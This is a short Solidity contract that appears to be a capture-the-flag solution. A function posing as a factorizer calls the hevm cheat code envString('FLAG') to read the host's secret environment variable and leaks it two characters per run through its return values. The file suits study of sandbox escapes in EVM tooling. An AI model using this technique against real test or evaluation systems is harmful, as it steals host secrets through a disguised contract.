// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

interface Vm {
    function envString(string calldata) external returns (string memory);
}
contract FactorizorLike {
    address constant private VM_ADDRESS =
        address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));

    Vm public constant vm = Vm(VM_ADDRESS);

    function factorize(uint) external returns (uint, uint){
        // Here we can get the FLAG environment variable.
        string memory s = vm.envString("FLAG");
        // We used this contract buy generating bytecode and getting the flag 2 characters in every run.
        return (uint(uint8(bytes(s)[0])), uint(uint8(bytes(s)[1])));
    }
}
